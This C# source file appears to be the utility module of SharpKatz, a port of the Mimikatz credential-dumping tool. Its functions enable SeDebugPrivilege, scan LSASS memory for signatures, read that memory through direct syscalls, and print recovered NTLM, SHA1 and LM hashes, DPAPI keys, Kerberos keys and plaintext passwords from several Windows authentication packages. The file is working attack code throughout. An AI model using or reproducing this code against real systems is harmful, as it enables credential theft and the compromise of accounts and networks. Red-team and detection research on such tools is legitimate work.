﻿using SharpKatz.Credential;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

using static SharpKatz.Natives;
using System.Globalization;

namespace SharpKatz
{
    class Utility
    {
        public static ulong SearchPattern(byte[] mem, byte[] signature)
        {
            ulong offset = 0;
            ulong memlen = (ulong)mem.Length;
            ulong signlen = (ulong)signature.Length;

            for (ulong i = 0; i < memlen; i++)
            {
                for (uint j = 0; j < signlen; j++)
                {
                    if (signature[j] != mem[i + j])
                    {
                        break;
                    }
                    else
                    {
                        if (j == (signlen - 1))
                        {
                            offset = i;
                            return offset;
                        }
                    }
                }
            }

            return offset;
        }

        public static ulong OffsetFromSign(string modulename, byte[] sign, long max_search_size)
        {
            IntPtr moduleLocal;
            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
            moduleLocal = Natives.LoadLibrary(modulename);
            if (moduleLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error: Could not load {0} into local process", modulename);
                return 0;
            }

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(moduleLocal, tmpbytes, 0, (int)max_search_size);

            return SearchPattern(tmpbytes, sign);
        }

        public static IntPtr GetIntPtr(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
        {
            long listMemOffset;
            IntPtr tmp_p = IntPtr.Add(msvMem, (int)signOffset + targetoffset);
            byte[] listMemOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            listMemOffset = BitConverter.ToInt32(listMemOffsetBytes, 0);

            int tmp_offset = 0;
            if (targetoffset > 0)
            {
                tmp_offset = (int)signOffset + targetoffset + sizeof(int) + (int)listMemOffset;
            }
            else
            {
                tmp_offset = (int)signOffset + (int)listMemOffset;
            }

            tmp_p = IntPtr.Add(msvMem, tmp_offset);
            byte[] listAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            IntPtr listAddr = new IntPtr(BitConverter.ToInt64(listAddrBytes, 0));

            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
            return listAddr;
        }

        public static int GetInt(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
        {
            long listMemOffset;
            IntPtr tmp_p = IntPtr.Add(msvMem, (int)signOffset + targetoffset);
            byte[] listMemOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
            listMemOffset = BitConverter.ToInt32(listMemOffsetBytes, 0);

            int tmp_offset = 0;
            if (targetoffset > 0)
            {
                tmp_offset = (int)signOffset + targetoffset + sizeof(int) + (int)listMemOffset;
            }
            else
            {
                tmp_offset = (int)signOffset + (int)listMemOffset;
            }

            tmp_p = IntPtr.Add(msvMem, tmp_offset);
            byte[] intAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            int intval = BitConverter.ToInt32(intAddrBytes, 0);

            //Console.WriteLine("[*] Kerberos UnloadLogonSessionTable found at address {0:X}", kerbUnloadLogonSessionTableAddr.ToInt64());
            return intval;
        }

        public static IntPtr GetListAdress(IntPtr hLsass, IntPtr msvMem, string modulename, long max_search_size, int listOffset, byte[] sign)
        {
            long listSignOffset, listMemOffset;
            IntPtr listAddr;

            listSignOffset = (long)OffsetFromSign(modulename, sign, max_search_size);
            if (listSignOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find signature into {0}", modulename);
                return IntPtr.Zero;
            }
            
            return GetIntPtr( hLsass,  msvMem, listSignOffset, listOffset);
        }

        // Read memory from LSASS process
        public static byte[] ReadFromLsass(ref IntPtr hLsass, IntPtr addr, ulong bytesToRead)
        {
            int bytesRead = 0;
            byte[] bytev = new byte[Convert.ToInt32(bytesToRead)];

            NTSTATUS status = SysCall.NtReadVirtualMemory10(hLsass, addr, bytev, Convert.ToInt32(bytesToRead), bytesRead);

            return bytev;
        }

        public static T ReadStruct<T>(byte[] array)
            where T : struct
        {

            GCHandle handle = GCHandle.Alloc(array, GCHandleType.Pinned);
            var mystruct = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return mystruct;
        }

        public unsafe static int FieldOffset<T>(string fieldName)
        {
            return Marshal.OffsetOf(typeof(T), fieldName).ToInt32();
        }

        public static unsafe byte[] ExtractSid(IntPtr hLsass, IntPtr pSid)
        {
            byte nbAuth;
            int sizeSid;

            Int64 pSidInt = Marshal.ReadInt64(pSid);

            byte[] nbAuth_b = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(new IntPtr(pSidInt), 1), 1);
            nbAuth = nbAuth_b[0];

            sizeSid = 4 * nbAuth + 6 + 1 + 1;

            byte[] sid_b = Utility.ReadFromLsass(ref hLsass, new IntPtr(pSidInt), (ulong)sizeSid);

            return sid_b;
        }

        public static T ReadStructFromLocalPtr<T>(IntPtr addr)
            where T : struct
        {
            T str = (T)Marshal.PtrToStructure(addr, typeof(T));

            return str;
        }

        public static unsafe Natives.UNICODE_STRING ExtractUnicodeString(IntPtr hLsass, IntPtr addr)
        {
            Natives.UNICODE_STRING str;
            
            byte[] strBytes = Utility.ReadFromLsass(ref hLsass, addr, Convert.ToUInt64(sizeof(Natives.UNICODE_STRING)));
            str = ReadStruct<Natives.UNICODE_STRING>(strBytes);

            return str;
        }

        public static unsafe string ExtractUnicodeStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
        {
            if (str.MaximumLength == 0)
            {
               return null;
            }

            // Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, (ulong)str.MaximumLength);
            UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
            try
            {
                return encoder.GetString(resultBytes);
            }
            catch(Exception)
            {
                return PrintHexBytes(resultBytes);
            }
        }

        public static unsafe string ExtractANSIStringString(IntPtr hLsass, Natives.UNICODE_STRING str)
        {
            if (str.MaximumLength == 0)
            {
                return null;
            }

            // Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
            byte[] resultBytes = ReadFromLsass(ref hLsass, str.Buffer, (ulong)str.MaximumLength);
            IntPtr tmp_p = Marshal.AllocHGlobal(resultBytes.Length);
            Marshal.Copy(resultBytes, 0, tmp_p, resultBytes.Length);

            return Marshal.PtrToStringAnsi(tmp_p);
        }

        public static string PrintHexBytes(byte[] byteArray)
        {
            StringBuilder res = new StringBuilder();
            for (int i = 0; i < byteArray.Length; i++)
            {
                res.AppendFormat("{0:x2} ", byteArray[i]);
            }
            return res.ToString();
        }

        public static string PrintHash(IntPtr lpData, int cbData)
        {
            byte[] byteArray = new byte[cbData];
            Marshal.Copy(lpData, byteArray, 0, cbData);

            return PrintHashBytes(byteArray);
        }

        public static string PrintHashBytes(byte[] byteArray)
        {
            StringBuilder res = new StringBuilder();
            for (int i = 0; i < byteArray.Length; i++)
            {
                res.AppendFormat("{0:x2}", byteArray[i]);
            }
            return res.ToString();
        }

        public static byte[] GetBytes(byte[] source, int startindex, int lenght)
        {
            byte[] resBytes = new byte[lenght];
            Array.Copy(source, startindex, resBytes, 0, resBytes.Length);
            return resBytes;
        }

        private static DateTime ToDateTime(FILETIME time)
        {
            long fileTime = (((long)time.dwHighDateTime) << 32) | ((uint)time.dwLowDateTime);

            try
            {
                return DateTime.FromFileTime(fileTime);
            }
            catch
            {
                return DateTime.FromFileTime(0xFFFFFFFF);
            }
        }

        public static void PrintLogonList(List<Logon> logonlist)
        {
            if (logonlist == null || logonlist.Count == 0)
                Console.WriteLine("No entry found");

            foreach (Logon logon in logonlist)
            {
                if (logon.Msv != null || logon.Ssp != null || logon.Wdigest != null || logon.Kerberos != null || logon.Tspkg != null || logon.Credman != null || logon.KerberosKeys != null)
                {
                    Console.WriteLine("[*] Authentication Id\t: {0};{1} ({2:X}:{3:X})", logon.LogonId.HighPart, logon.LogonId.LowPart, logon.LogonId.HighPart.ToString().PadLeft(8, '0'), logon.LogonId.LowPart.ToString().PadLeft(8, '0'));
                    Console.WriteLine("[*] Session\t\t: {0} from {1}", logon.LogonType, logon.Session);
                    Console.WriteLine("[*] UserName\t\t: {0}", logon.UserName);
                    Console.WriteLine("[*] LogonDomain\t\t: {0}", logon.LogonDomain);
                    Console.WriteLine("[*] LogonServer\t\t: {0}", logon.LogonServer);
                    Console.WriteLine("[*] LogonTime\t\t: {0:yyyy/MM/dd HH:mm:ss}", ToDateTime(logon.LogonTime));
                    Console.WriteLine("[*] SID\t\t\t: {0}", logon.SID);
                    Console.WriteLine("[*]");

                    
                    if (logon.Msv != null)
                    {
                        Console.WriteLine("[*]\t Msv");
                        Console.WriteLine("[*]\t  Domain   : {0}", logon.Msv.DomainName);
                        Console.WriteLine("[*]\t  Username : {0}", logon.Msv.UserName);
                        Console.WriteLine("[*]\t  LM       : {0}", logon.Msv.Lm);
                        Console.WriteLine("[*]\t  NTLM     : {0}", logon.Msv.Ntlm);
                        Console.WriteLine("[*]\t  SHA1     : {0}", logon.Msv.Sha1);
                        Console.WriteLine("[*]\t  DPAPI    : {0}", logon.Msv.Dpapi);
                        Console.WriteLine("[*]");
                    }
                    

                    
                    if (logon.Tspkg != null)
                    {
                        Console.WriteLine("[*]\t Tspkg");
                        Console.WriteLine("[*]\t  Domain   : {0}", logon.Tspkg.DomainName);
                        Console.WriteLine("[*]\t  Username : {0} ", logon.Tspkg.UserName);
                        Console.WriteLine("[*]\t  Password : {0}", logon.Tspkg.Password);
                        Console.WriteLine("[*]");
                    }
                    
                    
                    
                    if (logon.Wdigest != null)
                    {
                        Console.WriteLine("[*]\t WDigest");
                        Console.WriteLine("[*]\t  Hostname : {0} ", logon.Wdigest.HostName);
                        Console.WriteLine("[*]\t  Username : {0} ", logon.Wdigest.UserName);
                        Console.WriteLine("[*]\t  Password : {0}", logon.Wdigest.Password);
                        Console.WriteLine("[*]");
                    }
                    

                    
                    if (logon.Kerberos != null)
                    {
                        Console.WriteLine("[*]\t Kerberos");
                        Console.WriteLine("[*]\t  Domain   : {0} ", logon.Kerberos.DomainName);
                        Console.WriteLine("[*]\t  Username : {0} ", logon.Kerberos.UserName);
                        Console.WriteLine("[*]\t  Password : {0}", logon.Kerberos.Password);
                        Console.WriteLine("[*]");
                    }
                    

                    
                    if (logon.Ssp != null)
                    {
                        Console.WriteLine("[*]\t Ssp");
                        foreach (Ssp ssp in logon.Ssp)
                        {
                            Console.WriteLine("[*]\t  [{0}]", ssp.Reference.ToString().PadLeft(8, '0'));
                            Console.WriteLine("[*]\t  Domain   : {0}", ssp.DomainName);
                            Console.WriteLine("[*]\t  Username : {0} ", ssp.UserName);
                            Console.WriteLine("[*]\t  Password : {0}", ssp.Password);

                        }
                        Console.WriteLine("[*]");
                    }
                    

                    
                    if (logon.Credman != null)
                    {
                        Console.WriteLine("[*]\t CredMan");
                        foreach (CredMan cred in logon.Credman)
                        {
                            Console.WriteLine("[*]\t  [{0}]", cred.Reference.ToString().PadLeft(8, '0'));
                            Console.WriteLine("[*]\t  Domain   : {0}", cred.DomainName);
                            Console.WriteLine("[*]\t  Username : {0} ", cred.UserName);
                            Console.WriteLine("[*]\t  Password : {0}", cred.Password);

                        }
                        Console.WriteLine("[*]");
                    }

                    if (logon.KerberosKeys != null)
                    {
                        Console.WriteLine("[*]\t Key List");
                        foreach (KerberosKey kkey in logon.KerberosKeys)
                        {
                            Console.WriteLine("[*]\t {0}:{1}", kkey.Type, kkey.Key);

                        }
                        Console.WriteLine("[*]");
                    }
                    
                }
            }
        }

        public static bool SetDebugPrivilege()
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            string Privilege = "SeDebugPrivilege";
            IntPtr hToken = GetCurrentProcessToken();
            Natives.LUID luid = new Natives.LUID();
            if (!Natives.LookupPrivilegeValue(null, Privilege, ref luid))
            {
                Console.WriteLine("Error LookupPrivilegeValue" + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            Natives.LUID_AND_ATTRIBUTES luidAndAttributes = new Natives.LUID_AND_ATTRIBUTES();
            luidAndAttributes.Luid = luid;
            luidAndAttributes.Attributes = Natives.SE_PRIVILEGE_ENABLED;

            Natives.TOKEN_PRIVILEGES newState = new Natives.TOKEN_PRIVILEGES();
            newState.PrivilegeCount = 1;
            newState.Privileges = luidAndAttributes;

            Natives.TOKEN_PRIVILEGES previousState = new Natives.TOKEN_PRIVILEGES();
            UInt32 returnLength = 0;
            if (!Natives.AdjustTokenPrivileges(hToken, false, ref newState, (UInt32)Marshal.SizeOf(newState), ref previousState, out returnLength))
            {
                Console.WriteLine("AdjustTokenPrivileges() Error: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return false;
            }

            return true;
        }

        private static IntPtr GetCurrentProcessToken()
        {
            //https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Tokens.cs
            IntPtr currentProcessToken = new IntPtr();
            if (!Natives.OpenProcessToken(Process.GetCurrentProcess().Handle, Natives.TOKEN_ALL_ACCESS, out currentProcessToken))
            {
                Console.WriteLine("Error OpenProcessToken " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return IntPtr.Zero;
            }
            return currentProcessToken;
        }

        public static bool IsElevated()
        {
            return TokenIsElevated(GetCurrentProcessToken());
        }

        private static bool TokenIsElevated(IntPtr hToken)
        {
            Natives.TOKEN_ELEVATION tk = new Natives.TOKEN_ELEVATION();
            tk.TokenIsElevated = 0;

            IntPtr lpValue = Marshal.AllocHGlobal(Marshal.SizeOf(tk));
            Marshal.StructureToPtr(tk, lpValue, false);

            UInt32 tokenInformationLength = (UInt32)Marshal.SizeOf(typeof(Natives.TOKEN_ELEVATION));
            UInt32 returnLength;

            Boolean result = Natives.GetTokenInformation(
                hToken,
                Natives.TOKEN_INFORMATION_CLASS.TokenElevation,
                lpValue,
                tokenInformationLength,
                out returnLength
            );

            Natives.TOKEN_ELEVATION elv = (Natives.TOKEN_ELEVATION)Marshal.PtrToStructure(lpValue, typeof(Natives.TOKEN_ELEVATION));

            if (elv.TokenIsElevated == 1)
            {
                return true;
            }
            else
            {

                return false;
            }
        }

        public static string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

    }
}